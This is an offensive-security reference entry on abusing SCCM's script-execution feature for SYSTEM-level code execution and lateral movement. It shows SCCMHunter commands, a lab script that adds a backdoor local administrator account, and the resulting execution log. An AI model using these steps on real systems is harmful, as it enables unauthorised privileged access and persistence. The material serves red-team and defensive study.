# EXEC-2

## Description
Script Execution

## MITRE ATT&CK TTPs
- [TA0002](https://attack.mitre.org/tactics/TA0002) - Execution
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement

## Requirements
Permitted security roles:
- Full Administrator
- Operations Administrator
- A [custom](https://learn.microsoft.com/en-us/mem/configmgr/apps/deploy-use/create-deploy-scripts#bkmk_ScriptRoles) role configured with Create, Modify, Read, Delete, Approve, and Run Script.

## Summary
SCCM allows administrators to create and execute custom scripts on a single device or collection of devices.

## Impact
An attacker could use this technique to execute arbitrary code/commands on a remote client device as `SYSTEM`. 


## Defensive IDs
- 

## Examples
1. Following hiearchy takeover, use `SCCMHunter` to access the admin service API and then identify and interact with a target device. 

```
() (C:\) >> get_device mp
[13:58:34] INFO     ------------------------------------------                                                                                                                        
                    Active: 1                                                                                                                                                         
                    Client: 1                                                                                                                                                         
                    DistinguishedName: CN=MP,OU=SCCM_SiteSystems,DC=internal,DC=lab                                                                                                   
                    FullDomainName: INTERNAL.LAB                                                                                                                                      
                    IPAddresses: 10.10.100.13                                                                                                                                         
                    LastLogonUserDomain: None                                                                                                                                         
                    LastLogonUserName: None                                                                                                                                           
                    Name: MP                                                                                                                                                          
                    OperatingSystemNameandVersion: Microsoft Windows NT Server 10.0                                                                                                   
                    PrimaryGroupID: 515                                                                                                                                               
                    ResourceId: 16777235                                                                                                                                              
                    ResourceNames: mp.internal.lab                                                                                                                                    
                    SID: S-1-5-21-4004054868-2969153893-1580793631-1106                                                                                                               
                    SMSInstalledSites: LAB                                                                                                                                            
                    SMSUniqueIdentifier: GUID:D78C19DA-D4ED-474F-88D4-1566B96F2732                                                                                                    
                    ------------------------------------------                                                                                                                        
() (C:\) >> interact 16777235
(16777235) (C:\) >> 
```

2. Create a script. For this example the below is used:

```
net users
net localgroup administrators
net user sccm_script P@ssw0rd /add
net localgroup administrators sccm_script /add
net localgroup administrators
```

3. Execute the script with the `script` command

```
(16777235) (C:\) >> script script.txt
[14:06:21] INFO     [+] Updates script created successfully with GUID a0627fc9-6680-4850-8691-6b0d31ea0896. 
[14:06:24] INFO     [+] Script with guid a0627fc9-6680-4850-8691-6b0d31ea0896 approved.
[14:06:26] INFO     [+] Script with guid a0627fc9-6680-4850-8691-6b0d31ea0896 executed.
[14:06:43] INFO     [+] Got result:
[14:06:43] INFO     User accounts for \\\\

                    -------------------------------------------------------------------------------                                                                                   
                    Administrator            DefaultAccount           Guest                                                                                                           
                    WDAGUtilityAccount                                                                                                                                                
                    The command completed with one or more errors.                                                                                                                    
                                                                                                                                                                                      
                    Alias name     administrators                                                                                                                                     
                    Comment        Administrators have complete and unrestricted access to the computer/domain                                                                        
                                                                                                                                                                                      
                    Members                                                                                                                                                           
                                                                                                                                                                                      
                    -------------------------------------------------------------------------------                                                                                   
                    Administrator                                                                                                                                                     
                    LAB\\Domain Admins                                                                                                                                                
                    LAB\\SCCM$                                                                                                                                                        
                    LAB\\SCCM_SiteServers                                                                                                                                             
                    The command completed successfully.                                                                                                                               
                                                                                                                                                                                      
                    The command completed successfully.                                                                                                                               
                                                                                                                                                                                      
                    The command completed successfully.                                                                                                                               
                                                                                                                                                                                      
                    Alias name     administrators                                                                                                                                     
                    Comment        Administrators have complete and unrestricted access to the computer/domain                                                                        
                                                                                                                                                                                      
                    Members                                                                                                                                                           
                                                                                                                                                                                      
                    -------------------------------------------------------------------------------                                                                                   
                    Administrator                                                                                                                                                     
                    LAB\\Domain Admins                                                                                                                                                
                    LAB\\SCCM$                                                                                                                                                        
                    LAB\\SCCM_SiteServers                                                                                                                                             
                    sccm_script                                                                                                                                                       
                    The command completed successfully.                                                                                                                               
[14:06:45] INFO     [+] Script with GUID a0627fc9-6680-4850-8691-6b0d31ea0896 deleted.           
```

## References
- Microsoft, Create and run PowerShell scripts from the Configuration Manager console
,https://learn.microsoft.com/en-us/mem/configmgr/apps/deploy-use/create-deploy-scripts
